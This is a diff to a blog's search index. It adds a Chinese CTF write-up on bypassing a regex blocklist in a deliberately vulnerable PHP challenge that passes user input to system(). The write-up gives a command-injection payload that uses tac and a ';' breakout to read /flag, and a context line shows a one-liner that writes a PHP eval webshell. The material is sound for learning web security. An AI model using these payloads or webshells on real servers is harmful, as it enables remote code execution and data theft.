@@ -553,4 +553,22 @@ fputs(fopen('shell.php','w'),'<?php @eval($_POST['df']); ?><p>‘);</p>
 <p>p为参数</p>
 ]]></content>
   </entry>
+  <entry>
+    <title>命令执行easy bypass</title>
+    <url>/2022/12/01/hhy/</url>
+    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$comm1 = $_GET[&#x27;comm1&#x27;];</span><br><span class="line">$comm2 = $_GET[&#x27;comm2&#x27;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(preg_match(&quot;/\&#x27;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $comm1))</span><br><span class="line">    $comm1 = &quot;&quot;;</span><br><span class="line">if(preg_match(&quot;/\&#x27;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is&quot;, $comm2))</span><br><span class="line">    $comm2 = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">$flag = &quot;#flag in /flag&quot;;</span><br><span class="line"></span><br><span class="line">$comm1 = &#x27;&quot;&#x27; . $comm1 . &#x27;&quot;&#x27;;</span><br><span class="line">$comm2 = &#x27;&quot;&#x27; . $comm2 . &#x27;&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">$cmd = &quot;file $comm1 $comm2&quot;;</span><br><span class="line">system($cmd);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>1.因为最开始过滤了cat</p>
+<p>所以思考用tac替代,来模糊匹配</p>
+<p>2.*<em>tac命令</em></p>
+<p>反序输出文件的内容，文件的最后一行显示在第一行</p>
+<p>它可以对调试日志文件提供了很大的帮助，扭转日志内容的时间顺序。</p>
+<p>3.”file $comm1 $comm2”</p>
+<p>考虑用;来绕过file</p>
+<p>file只能返回文件格式</p>
+<p>构造</p>
+<p>&#x2F;?comm1&#x3D;index.php”;tac &#x2F;fla?;”&amp;comm2&#x3D;1</p>
+<p><img src="/2022/12/01/hhy/result.jpg" alt="题图"></p>
+]]></content>
+  </entry>
 </search>
